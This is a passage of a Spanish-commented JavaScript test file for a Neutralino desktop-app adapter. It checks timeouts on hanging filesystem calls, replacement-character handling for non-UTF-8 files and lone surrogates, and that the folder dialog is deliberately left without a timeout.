    try { await conPlazo(new Promise(() => {}), 'leer algo', 120); }
    catch (e) { colgado = e; }
    ok('una promesa que no se resuelve acaba en error', !!colgado);
    eq('y se distingue por su código', colgado && colgado.code, 'NE_SIN_RESPUESTA');
    ok('el mensaje dice qué se estaba haciendo', /leer algo/.test(colgado ? colgado.message : ''), colgado && colgado.message);

    let propagado = null;
    try { await conPlazo(Promise.reject(new Error('fallo real')), 'algo', 500); }
    catch (e) { propagado = e; }
    ok('un error de verdad sigue subiendo tal cual', propagado && propagado.message === 'fallo real');

    // Y el camino de lectura ya no pasa por readFile.
    const antesNL = globalThis.Neutralino;
    const antesOS = globalThis.NL_OS;
    const cp1252 = new Uint8Array([0x2f, 0x2f, 0x20, 0x76, 0x65, 0x72, 0x73, 0x69, 0xF3, 0x6e, 0x0a]);
    let escrito = null;
    let usoReadFile = false;
    globalThis.NL_OS = 'Windows';
    globalThis.Neutralino = {
        events: { on() {} },
        filesystem: {
            readFile: async () => { usoReadFile = true; return new Promise(() => {}); },
            readBinaryFile: async () => cp1252.buffer,
            writeFile: async () => { usoReadFile = true; return new Promise(() => {}); },
            writeBinaryFile: async (_p, buf) => { escrito = new Uint8Array(buf); },
            getStats: async () => ({ isFile: true, isDirectory: false, size: 0, modifiedAt: 0 }),
            createDirectory: async () => {}
        }
    };
    try {
        const plataforma = createNeutralinoPlatform();

        const texto = await plataforma.fs.readText('C:/lab/cp1252.js');
        ok('un archivo que no es UTF-8 se lee en vez de colgarse', typeof texto === 'string', JSON.stringify(texto));
        eq('y los bytes malos salen como U+FFFD', texto, '// versi\uFFFDn\n');
        ok('sin pasar por readFile', !usoReadFile);

        // El otro sentido: medio par suplente, que es lo que deja un modelo al
        // partir un emoji. Antes tampoco se resolvía.
        await plataforma.fs.writeText('C:/lab/roto.txt', 'hola \uD800 adiós');
        ok('escribir con medio par suplente no cuelga', !!escrito);
        eq('se escribe UTF-8 saneado', new TextDecoder('utf-8').decode(escrito), 'hola \uFFFD adiós');
    } finally {
        if (antesNL === undefined) delete globalThis.Neutralino; else globalThis.Neutralino = antesNL;
        if (antesOS === undefined) delete globalThis.NL_OS; else globalThis.NL_OS = antesOS;
    }

    // El diálogo de carpeta es lo único que NO puede llevar plazo: lo modal lo
    // decide la persona, y treinta segundos eligiendo carpeta son normales.
    const fuenteAdaptador = (await import('node:fs')).default.readFileSync(
        (await import('node:url')).fileURLToPath(new URL('../platform/neutralino.js', import.meta.url)), 'utf8');
    ok('showFolderDialog se queda sin plazo a propósito',
        /showFolderDialog/.test(fuenteAdaptador) && !/conPlazo\(NL\(\)\.os\.showFolderDialog/.test(fuenteAdaptador));
    ok('pero las lecturas y escrituras sí lo llevan',
        /conPlazo\(\s*NL\(\)\.filesystem\.readBinaryFile/.test(fuenteAdaptador)
        && /conPlazo\(\s*NL\(\)\.filesystem\.writeBinaryFile/.test(fuenteAdaptador));
}

// ── report ────────────────────────────────────────────────────────────────
console.log(`\n${'─'.repeat(50)}`);
if (failed) {
    console.log(`${passed} pasaron, ${failed} FALLARON\n`);
    for (const f of failures) console.log(`  ✗ ${f}`);
    process.exit(1);
}
console.log(`${passed} pruebas pasaron.`);
